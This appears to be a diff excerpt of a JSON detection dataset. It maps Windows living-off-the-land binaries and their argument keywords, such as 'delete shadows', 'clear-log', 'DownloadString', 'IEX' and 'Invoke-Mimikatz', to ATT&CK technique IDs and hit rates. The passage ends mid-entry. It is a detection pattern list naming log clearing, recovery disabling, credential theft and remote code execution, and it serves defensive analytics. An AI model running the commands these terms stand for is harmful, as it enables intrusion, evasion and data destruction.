+      "file_rate": 0.0136,
+      "files_hit": 14,
+      "kind": "lolbin_arg",
+      "subject": "SC",
+      "techniques": [
+        "T1543.003",
+        "T1569.002"
+      ],
+      "term": "boot"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "BcdEdit",
+      "techniques": [
+        "T1490",
+        "T1562.001"
+      ],
+      "term": "bootstatuspolicy"
+    },
+    {
+      "events_hit": 71,
+      "file_rate": 0.0039,
+      "files_hit": 4,
+      "kind": "lolbin_arg",
+      "subject": "NetSh",
+      "techniques": [
+        "T1090",
+        "T1571",
+        "T1049"
+      ],
+      "term": "bridge"
+    },
+    {
+      "events_hit": 32,
+      "file_rate": 0.0049,
+      "files_hit": 5,
+      "kind": "lolbin_arg",
+      "subject": "FTP",
+      "techniques": [
+        "T1048",
+        "T1105"
+      ],
+      "term": "bye"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "PowerShell",
+      "techniques": [
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "Bypass"
+    },
+    {
+      "events_hit": 106,
+      "file_rate": 0.0224,
+      "files_hit": 23,
+      "kind": "lolbin_arg",
+      "subject": "MakeCab",
+      "techniques": [
+        "T1560.001",
+        "T1002"
+      ],
+      "term": "cab"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "WevtUtil",
+      "techniques": [
+        "T1070",
+        "T1562.002"
+      ],
+      "term": "clear-log"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "MSBuild",
+      "techniques": [
+        "T1127.001",
+        "T1059.001"
+      ],
+      "term": "CodeTaskFactory"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "Reg",
+      "techniques": [
+        "T1112",
+        "T1012",
+        "T1547.001",
+        "T1546",
+        "T1003.002",
+        "T1552.002",
+        "T1562.001"
+      ],
+      "term": "compare"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "MakeCab",
+      "techniques": [
+        "T1560.001",
+        "T1002"
+      ],
+      "term": "compress"
+    },
+    {
+      "events_hit": 522,
+      "file_rate": 0.0078,
+      "files_hit": 8,
+      "kind": "lolbin_arg",
+      "subject": "Net",
+      "techniques": [
+        "T1087.001",
+        "T1087.002",
+        "T1136.001",
+        "T1069.001",
+        "T1069.002",
+        "T1078",
+        "T1033"
+      ],
+      "term": "computer"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "WMIC",
+      "techniques": [
+        "T1047",
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "computersystem get"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "ODBCConf",
+      "techniques": [
+        "T1218.008",
+        "T1059.001"
+      ],
+      "term": "CONFIGDRIVER"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "ODBCConf",
+      "techniques": [
+        "T1218.008",
+        "T1059.001"
+      ],
+      "term": "CONFIGDSN"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "ODBCConf",
+      "techniques": [
+        "T1218.008",
+        "T1059.001"
+      ],
+      "term": "CONFIGSYSDSN"
+    },
+    {
+      "events_hit": 36,
+      "file_rate": 0.0029,
+      "files_hit": 3,
+      "kind": "lolbin_arg",
+      "subject": "Net",
+      "techniques": [
+        "T1087.001",
+        "T1087.002",
+        "T1136.001",
+        "T1069.001",
+        "T1069.002",
+        "T1078",
+        "T1033"
+      ],
+      "term": "continue"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "Control",
+      "techniques": [
+        "T1218.002",
+        "T1059.001"
+      ],
+      "term": "control.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "Rclone",
+      "techniques": [
+        "T1567.002",
+        "T1048"
+      ],
+      "term": "copy"
+    },
+    {
+      "events_hit": 570,
+      "file_rate": 0.0263,
+      "files_hit": 27,
+      "kind": "lolbin_arg",
+      "subject": "SC",
+      "techniques": [
+        "T1543.003",
+        "T1569.002"
+      ],
+      "term": "create"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "VssAdmin",
+      "techniques": [
+        "T1490",
+        "T1070"
+      ],
+      "term": "create shadow"
+    },
+    {
+      "events_hit": 674,
+      "file_rate": 0.0127,
+      "files_hit": 13,
+      "kind": "lolbin_arg",
+      "subject": "NetSh",
+      "techniques": [
+        "T1090",
+        "T1571",
+        "T1049"
+      ],
+      "term": "delete"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "VssAdmin",
+      "techniques": [
+        "T1490",
+        "T1070"
+      ],
+      "term": "delete shadows"
+    },
+    {
+      "events_hit": 109,
+      "file_rate": 0.0088,
+      "files_hit": 9,
+      "kind": "lolbin_arg",
+      "subject": "SC",
+      "techniques": [
+        "T1543.003",
+        "T1569.002"
+      ],
+      "term": "description"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "Rundll32",
+      "techniques": [
+        "T1059.001",
+        "T1218.011"
+      ],
+      "term": "desk.cpl"
+    },
+    {
+      "events_hit": 25,
+      "file_rate": 0.0068,
+      "files_hit": 7,
+      "kind": "lolbin_arg",
+      "subject": "NetSh",
+      "techniques": [
+        "T1090",
+        "T1571",
+        "T1049"
+      ],
+      "term": "dhcp"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "PowerShell",
+      "techniques": [
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "DownloadString"
+    },
+    {
+      "events_hit": 29,
+      "file_rate": 0.0068,
+      "files_hit": 7,
+      "kind": "lolbin_arg",
+      "subject": "WScript",
+      "techniques": [
+        "T1059.005",
+        "T1059.007"
+      ],
+      "term": "echo"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "PowerShell",
+      "techniques": [
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "Enter-PSSession"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "SC",
+      "techniques": [
+        "T1543.003",
+        "T1569.002"
+      ],
+      "term": "enumdepend"
+    },
+    {
+      "events_hit": 2116,
+      "file_rate": 0.0331,
+      "files_hit": 34,
+      "kind": "lolbin_arg",
+      "subject": "WevtUtil",
+      "techniques": [
+        "T1070",
+        "T1562.002"
+      ],
+      "term": "epl"
+    },
+    {
+      "events_hit": 163,
+      "file_rate": 0.0127,
+      "files_hit": 13,
+      "kind": "lolbin_arg",
+      "subject": "WScript",
+      "techniques": [
+        "T1059.005",
+        "T1059.007"
+      ],
+      "term": "exec"
+    },
+    {
+      "events_hit": 99,
+      "file_rate": 0.0029,
+      "files_hit": 3,
+      "kind": "lolbin_arg",
+      "subject": "Reg",
+      "techniques": [
+        "T1112",
+        "T1012",
+        "T1547.001",
+        "T1546",
+        "T1003.002",
+        "T1552.002",
+        "T1562.001"
+      ],
+      "term": "export"
+    },
+    {
+      "events_hit": 6,
+      "file_rate": 0.0029,
+      "files_hit": 3,
+      "kind": "lolbin_arg",
+      "subject": "MakeCab",
+      "techniques": [
+        "T1560.001",
+        "T1002"
+      ],
+      "term": "extract"
+    },
+    {
+      "events_hit": 148,
+      "file_rate": 0.0097,
+      "files_hit": 10,
+      "kind": "lolbin_arg",
+      "subject": "SC",
+      "techniques": [
+        "T1543.003",
+        "T1569.002"
+      ],
+      "term": "failure"
+    },
+    {
+      "events_hit": 897,
+      "file_rate": 0.0068,
+      "files_hit": 7,
+      "kind": "lolbin_arg",
+      "subject": "NetSh",
+      "techniques": [
+        "T1090",
+        "T1571",
+        "T1049"
+      ],
+      "term": "firewall"
+    },
+    {
+      "events_hit": 151,
+      "file_rate": 0.0097,
+      "files_hit": 10,
+      "kind": "lolbin_arg",
+      "subject": "Reg",
+      "techniques": [
+        "T1112",
+        "T1012",
+        "T1547.001",
+        "T1546",
+        "T1003.002",
+        "T1552.002",
+        "T1562.001"
+      ],
+      "term": "flags"
+    },
+    {
+      "events_hit": 51,
+      "file_rate": 0.0117,
+      "files_hit": 12,
+      "kind": "lolbin_arg",
+      "subject": "MSDT",
+      "techniques": [
+        "T1218.005",
+        "T1059.001"
+      ],
+      "term": "force"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "PowerShell",
+      "techniques": [
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "FromBase64String"
+    },
+    {
+      "events_hit": 891,
+      "file_rate": 0.0468,
+      "files_hit": 48,
+      "kind": "lolbin_arg",
+      "subject": "FTP",
+      "techniques": [
+        "T1048",
+        "T1105"
+      ],
+      "term": "get"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "SC",
+      "techniques": [
+        "T1543.003",
+        "T1569.002"
+      ],
+      "term": "getdisplayname"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "SC",
+      "techniques": [
+        "T1543.003",
+        "T1569.002"
+      ],
+      "term": "getkeyname"
+    },
+    {
+      "events_hit": 1472,
+      "file_rate": 0.04,
+      "files_hit": 41,
+      "kind": "lolbin_arg",
+      "subject": "Net",
+      "techniques": [
+        "T1087.001",
+        "T1087.002",
+        "T1136.001",
+        "T1069.001",
+        "T1069.002",
+        "T1078",
+        "T1033"
+      ],
+      "term": "group"
+    },
+    {
+      "events_hit": 188,
+      "file_rate": 0.0127,
+      "files_hit": 13,
+      "kind": "lolbin_arg",
+      "subject": "Net",
+      "techniques": [
+        "T1087.001",
+        "T1087.002",
+        "T1136.001",
+        "T1069.001",
+        "T1069.002",
+        "T1078",
+        "T1033"
+      ],
+      "term": "help"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "Net",
+      "techniques": [
+        "T1087.001",
+        "T1087.002",
+        "T1136.001",
+        "T1069.001",
+        "T1069.002",
+        "T1078",
+        "T1033"
+      ],
+      "term": "helpmsg"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "HTML Help",
+      "techniques": [
+        "T1218.001",
+        "T1059.007"
+      ],
+      "term": "hh.exe"
+    },
+    {
+      "events_hit": 578,
+      "file_rate": 0.0292,
+      "files_hit": 30,
+      "kind": "lolbin_arg",
+      "subject": "MSHTA",
+      "techniques": [
+        "T1059.005",
+        "T1218.005"
+      ],
+      "term": "http"
+    },
+    {
+      "events_hit": 132,
+      "file_rate": 0.0166,
+      "files_hit": 17,
+      "kind": "lolbin_arg",
+      "subject": "MSHTA",
+      "techniques": [
+        "T1059.005",
+        "T1218.005"
+      ],
+      "term": "https"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "Rundll32",
+      "techniques": [
+        "T1059.001",
+        "T1218.011"
+      ],
+      "term": "ieadvpack.dll"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "IEExec",
+      "techniques": [
+        "T1218.003",
+        "T1059.001"
+      ],
+      "term": "ieexec.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "PowerShell",
+      "techniques": [
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "IEX"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "BcdEdit",
+      "techniques": [
+        "T1490",
+        "T1562.001"
+      ],
+      "term": "ignoreallfailures"
+    },
+    {
+      "events_hit": 50,
+      "file_rate": 0.0049,
+      "files_hit": 5,
+      "kind": "lolbin_arg",
+      "subject": "Reg",
+      "techniques": [
+        "T1112",
+        "T1012",
+        "T1547.001",
+        "T1546",
+        "T1003.002",
+        "T1552.002",
+        "T1562.001"
+      ],
+      "term": "import"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "Rundll32",
+      "techniques": [
+        "T1059.001",
+        "T1218.011"
+      ],
+      "term": "inetcpl.cpl"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "MSBuild",
+      "techniques": [
+        "T1127.001",
+        "T1059.001"
+      ],
+      "term": "InlineTask"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "ODBCConf",
+      "techniques": [
+        "T1218.008",
+        "T1059.001"
+      ],
+      "term": "INSTALLDRIVER"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "InstallUtil",
+      "techniques": [
+        "T1218.004",
+        "T1059.001"
+      ],
+      "term": "Installer"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "ODBCConf",
+      "techniques": [
+        "T1218.008",
+        "T1059.001"
+      ],
+      "term": "INSTALLTRANSLATOR"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "InstallUtil",
+      "techniques": [
+        "T1218.004",
+        "T1059.001"
+      ],
+      "term": "InstallUtil.exe"
+    },
+    {
+      "events_hit": 140,
+      "file_rate": 0.0078,
+      "files_hit": 8,
+      "kind": "lolbin_arg",
+      "subject": "NetSh",
+      "techniques": [
+        "T1090",
+        "T1571",
+        "T1049"
+      ],
+      "term": "interface"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "Rundll32",
+      "techniques": [
+        "T1059.001",
+        "T1218.011"
+      ],
+      "term": "intl.cpl"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "PowerShell",
+      "techniques": [
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "Invoke-Command"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "PowerShell",
+      "techniques": [
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "Invoke-DllInjection"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "PowerShell",
+      "techniques": [
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "Invoke-Expression"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "PowerShell",
+      "techniques": [
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "Invoke-Mimikatz"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "PowerShell",
+      "techniques": [
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "Invoke-PSInject"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "PowerShell",
+      "techniques": [
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "Invoke-ReflectivePEInjection"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "PowerShell",
+      "techniques": [
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "Invoke-Shellcode"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "PowerShell",
+      "techniques": [
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "Invoke-TokenManipulation"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "PowerShell",
+      "techniques": [
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "Invoke-WmiMethod"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "PsExec",
+      "techniques": [
+        "T1021.002",
+        "T1569.002"
+      ],
+      "term": "ipc$"
+    },
+    {
+      "events_hit": 6,
+      "file_rate": 0.001,
+      "files_hit": 1,
+      "kind": "lolbin_arg",
+      "subject": "NetSh",
+      "techniques": [
+        "T1090",
+        "T1571",
+        "T1049"
+      ],
+      "term": "ipsec"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "NetSh",
+      "techniques": [
+        "T1090",
+        "T1571",
+        "T1049"
+      ],
+      "term": "isatap"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "MSHTA",
+      "techniques": [
+        "T1059.005",
+        "T1218.005"
+      ],
+      "term": "javascript:"
+    },
+    {
+      "events_hit": 154,
+      "file_rate": 0.0244,
+      "files_hit": 25,
+      "kind": "lolbin_arg",
+      "subject": "NetSh",
+      "techniques": [
+        "T1090",
+        "T1571",
+        "T1049"
+      ],
+      "term": "lan"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "VssAdmin",
+      "techniques": [
+        "T1490",
+        "T1070"
+      ],
+      "term": "list shadows"
+    },
+    {
+      "events_hit": 217,
+      "file_rate": 0.0166,
+      "files_hit": 17,
+      "kind": "lolbin_arg",
+      "subject": "Reg",
+      "techniques": [
+        "T1112",
+        "T1012",
+        "T1547.001",
+        "T1546",
+        "T1003.002",
+        "T1552.002",
+        "T1562.001"
+      ],
+      "term": "load"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "Net",
+      "techniques": [
+        "T1087.001",
+        "T1087.002",
+        "T1136.001",
+        "T1069.001",
+        "T1069.002",
+        "T1078",
+        "T1033"
+      ],
+      "term": "localgroup"
+    },
+    {
+      "events_hit": 237,
+      "file_rate": 0.0351,
+      "files_hit": 36,
+      "kind": "lolbin_arg",
+      "subject": "SC",
+      "techniques": [
+        "T1543.003",
+        "T1569.002"
+      ],
+      "term": "lock"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "Rundll32",
+      "techniques": [
+        "T1059.001",
+        "T1218.011"
+      ],
+      "term": "main.cpl"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "SC",
+      "techniques": [
+        "T1543.003",
+        "T1569.002"
+      ],
+      "term": "managedby"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "MavInject",
+      "techniques": [
+        "T1055.001",
+        "T1218.013"
+      ],
+      "term": "mavinject.exe"
+    },
+    {
+      "events_hit": 3,
+      "file_rate": 0.001,
+      "files_hit": 1,
+      "kind": "lolbin_arg",
+      "subject": "NetSh",
+      "techniques": [
+        "T1090",
+        "T1571",
+        "T1049"
+      ],
+      "term": "mbn"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "FTP",
+      "techniques": [
+        "T1048",
+        "T1105"
+      ],
+      "term": "mget"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "MSBuild",
+      "techniques": [
+        "T1127.001",
+        "T1059.001"
+      ],
+      "term": "Microsoft.Common.Tasks"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "Rundll32",
+      "techniques": [
+        "T1059.001",
+        "T1218.011"
+      ],
+      "term": "mmsys.cpl"
+    },
+    {
+      "events_hit": 32,
+      "file_rate": 0.0049,
+      "files_hit": 5,
+      "kind": "lolbin_arg",
+      "subject": "Rclone",
+      "techniques": [
+        "T1567.002",
+        "T1048"
+      ],
+      "term": "move"
+    },
+    {
+      "events_hit": 528,
+      "file_rate": 0.0097,
+      "files_hit": 10,
+      "kind": "lolbin_arg",
+      "subject": "FTP",
+      "techniques": [
+        "T1048",
+        "T1105"
+      ],
+      "term": "mput"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "MSDT",
+      "techniques": [
+        "T1218.005",
+        "T1059.001"
+      ],
+      "term": "ms-msdt:"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "MSBuild",
+      "techniques": [
+        "T1127.001",
+        "T1059.001"
+      ],
+      "term": "MSBuild.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "Rundll32",
+      "techniques": [
+        "T1059.001",
+        "T1218.011"
+      ],
+      "term": "mshtml.dll"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "MsiExec",
+      "techniques": [
+        "T1218.007",
+        "T1059.001"
+      ],
+      "term": "msiexec.exe"
+    },
+    {
+      "events_hit": 1450,
+      "file_rate": 0.038,
+      "files_hit": 39,
+      "kind": "lolbin_arg",
+      "subject": "Net",
+      "techniques": [
+        "T1087.001",
+        "T1087.002",
+        "T1136.001",
+        "T1069.001",
+        "T1069.002",
+        "T1078",
+        "T1033"
+      ],
+      "term": "name"
+    },
+    {
+      "events_hit": 15,
+      "file_rate": 0.0039,
+      "files_hit": 4,
+      "kind": "lolbin_arg",
+      "subject": "NetSh",
+      "techniques": [
+        "T1090",
+        "T1571",
+        "T1049"
+      ],
+      "term": "namespace"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "Rundll32",
+      "techniques": [
+        "T1059.001",
+        "T1218.011"
+      ],
+      "term": "ncpa.cpl"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "PowerShell",
+      "techniques": [
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "New-PSSession"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "WMIC",
+      "techniques": [
+        "T1047",
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "nic get"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "ODBCConf",
+      "techniques": [
+        "T1218.008",
+        "T1059.001"
+      ],
+      "term": "odbcconf.exe"
+    },
+    {
+      "events_hit": 69,
+      "file_rate": 0.0068,
+      "files_hit": 7,
+      "kind": "lolbin_arg",
+      "subject": "FTP",
+      "techniques": [
+        "T1048",
+        "T1105"
+      ],
+      "term": "open"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "WMIC",
+      "techniques": [
+        "T1047",
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "os get"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "Net",
+      "techniques": [
+        "T1087.001",
+        "T1087.002",
+        "T1136.001",
+        "T1069.001",
+        "T1069.002",
+        "T1078",
+        "T1033"
+      ],
+      "term": "pause"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "MSDT",
+      "techniques": [
+        "T1218.005",
+        "T1059.001"
+      ],
+      "term": "pcwrun"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "NetSh",
+      "techniques": [
+        "T1090",
+        "T1571",
+        "T1049"
+      ],
+      "term": "portproxy"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "Rundll32",
+      "techniques": [
+        "T1059.001",
+        "T1218.011"
+      ],
+      "term": "powercfg.cpl"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "PresentationHost",
+      "techniques": [
+        "T1218.007",
+        "T1059.001"
+      ],
+      "term": "presentationhost.exe"
+    },
+    {
+      "events_hit": 154,
+      "file_rate": 0.0283,
+      "files_hit": 29,
+      "kind": "lolbin_arg",
+      "subject": "Net",
+      "techniques": [
+        "T1087.001",
+        "T1087.002",
+        "T1136.001",
+        "T1069.001",
+        "T1069.002",
+        "T1078",
+        "T1033"
+      ],
+      "term": "print"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "SC",
+      "techniques": [
+        "T1543.003",
+        "T1569.002"
+      ],
+      "term": "privs"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "WMIC",
+      "techniques": [
+        "T1047",
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "process call create"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "WMIC",
+      "techniques": [
+        "T1047",
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "process get"
+    },
+    {
+      "events_hit": 781,
+      "file_rate": 0.0331,
+      "files_hit": 34,
+      "kind": "lolbin_arg",
+      "subject": "FTP",
+      "techniques": [
+        "T1048",
+        "T1105"
+      ],
+      "term": "put"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "WMIC",
+      "techniques": [
+        "T1047",
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "qfe get"
+    },
+    {
+      "events_hit": 388,
+      "file_rate": 0.0097,
+      "files_hit": 10,
+      "kind": "lolbin_arg",
+      "subject": "Reg",
+      "techniques": [
+        "T1112",
+        "T1012",
+        "T1547.001",
+        "T1546",
+        "T1003.002",
+        "T1552.002",
+        "T1562.001"
+      ],
+      "term": "query"
+    },
+    {
+      "events_hit": 242,
+      "file_rate": 0.0195,
+      "files_hit": 20,
+      "kind": "lolbin_arg",
+      "subject": "NetSh",
+      "techniques": [
+        "T1090",
+        "T1571",
+        "T1049"
+      ],
+      "term": "ras"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "BcdEdit",
+      "techniques": [
+        "T1490",
+        "T1562.001"
+      ],
+      "term": "recoveryenabled"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "RegAsm",
+      "techniques": [
+        "T1218.009",
+        "T1059.001"
+      ],
+      "term": "regasm.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "PowerShell",
+      "techniques": [
+        "T1059.001",
+        "T1059.003"
+      ],
+      "term": "Register-ScheduledJob"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "RegAsm",
+      "techniques": [
+        "T1218.009",
+        "T1059.001"
+      ],
+      "term": "RegistrationServices"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "lolbin_arg",
+      "subject": "RegSvcs",
+      "techniques": [
+        "T1218.009",
+        "T1059.001"
+      ],
